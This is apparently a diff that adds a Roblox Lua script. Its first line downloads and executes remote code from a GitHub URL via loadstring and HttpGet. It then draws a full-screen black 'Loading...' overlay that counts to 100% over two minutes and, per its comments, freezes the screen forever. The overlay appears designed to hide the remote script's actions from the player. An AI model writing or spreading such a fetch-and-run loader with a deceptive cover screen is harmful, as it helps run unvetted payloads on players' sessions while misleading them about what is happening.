@@ -1,0 +1,56 @@
+-- Run your original script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gey123123/roblox-script123/refs/heads/main/script"))()
+
+-- Delay slightly to ensure your main script finishes initial execution (e.g. teleporting)
+task.wait(1)
+
+-- Create the loading screen UI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "FreezeLoadingUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+
+-- Parent to PlayerGui
+local player = game.Players.LocalPlayer
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Full black background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.BorderSizePixel = 0
+bg.Parent = ScreenGui
+
+-- Loading text
+local loadingLabel = Instance.new("TextLabel")
+loadingLabel.Size = UDim2.new(0, 400, 0, 60)
+loadingLabel.Position = UDim2.new(0.5, -200, 0.5, -30)
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.TextColor3 = Color3.new(1, 1, 1)
+loadingLabel.Font = Enum.Font.SourceSansBold
+loadingLabel.TextScaled = true
+loadingLabel.Text = "Loading... 1%"
+loadingLabel.Parent = bg
+
+-- "Made by" text
+local creditLabel = Instance.new("TextLabel")
+creditLabel.Size = UDim2.new(1, 0, 0, 30)
+creditLabel.Position = UDim2.new(0, 0, 1, -35)
+creditLabel.BackgroundTransparency = 1
+creditLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+creditLabel.Font = Enum.Font.GothamSemibold
+creditLabel.TextScaled = true
+creditLabel.Text = "made by: g3zmar"
+creditLabel.Parent = bg
+
+-- Smooth loading: 1% to 100% in 2 minutes (120s)
+task.spawn(function()
+	for i = 1, 100 do
+		loadingLabel.Text = "Loading... " .. i .. "%"
+		task.wait(1.2)  -- 1.2s * 100 = 120s
+	end
+	
+	-- Freeze screen after 100% (do nothing, just keep UI forever)
+	loadingLabel.Text = "Loading... 100%"
+end)
